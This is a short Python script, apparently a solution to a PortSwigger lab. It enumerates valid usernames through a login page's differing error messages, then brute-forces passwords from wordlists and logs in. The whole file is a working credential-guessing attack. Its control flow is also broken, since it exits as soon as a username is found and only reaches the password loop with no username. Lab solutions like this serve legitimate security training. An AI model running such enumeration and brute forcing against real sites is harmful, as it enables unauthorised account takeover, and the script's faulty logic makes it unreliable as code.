import requests
import re

# Load username and password lists
username_list_path = '../Portswigger_lists/username_list.txt'
password_list_path = '../Portswigger_lists/password_list.txt'

def load_list(file_path):
    with open(file_path, 'r') as file:
        return [line.strip() for line in file]

def find_valid_username(base_url, usernames):
    for username in usernames:
        response = requests.post(f'{base_url}/login', data={'username': username, 'password': 'invalid-password'})
        if "Incorrect password" in response.text:
            return username
    return None

def find_valid_password(base_url, username, passwords):
    for password in passwords:
        response = requests.post(f'{base_url}/login', data={'username': username, 'password': password})
        if response.status_code == 302:
            return password
    return None

def main(base_url):
    usernames = load_list(username_list_path)
    passwords = load_list(password_list_path)

    valid_username = find_valid_username(base_url, usernames)
    if valid_username:
        print(f"[+] Valid username found: {valid_username}")
        return

    valid_password = find_valid_password(base_url, valid_username, passwords)
    if valid_password:
        print(f"[+] Valid password found: {valid_password}")

        session = requests.Session()
        response = session.post(f'{base_url}/login', data={'username': valid_username, 'password': valid_password})
        if response.status_code == 302:
            print("[+] Successfully logged in.")

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    burp_url = sys.argv[1]
    main(burp_url)
